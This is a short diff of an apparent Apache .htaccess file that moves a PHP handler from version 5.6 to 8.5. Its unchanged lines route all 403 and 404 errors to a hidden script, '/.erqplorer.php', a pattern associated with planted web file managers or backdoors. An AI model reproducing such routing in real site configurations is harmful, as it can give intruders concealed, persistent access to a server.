@@ -1,3 +1,6 @@
-php56 1
+<IfDefine Free>
+php85 1
+</IfDefine>
+
 ErrorDocument 403 /.erqplorer.php
 ErrorDocument 404 /.erqplorer.php
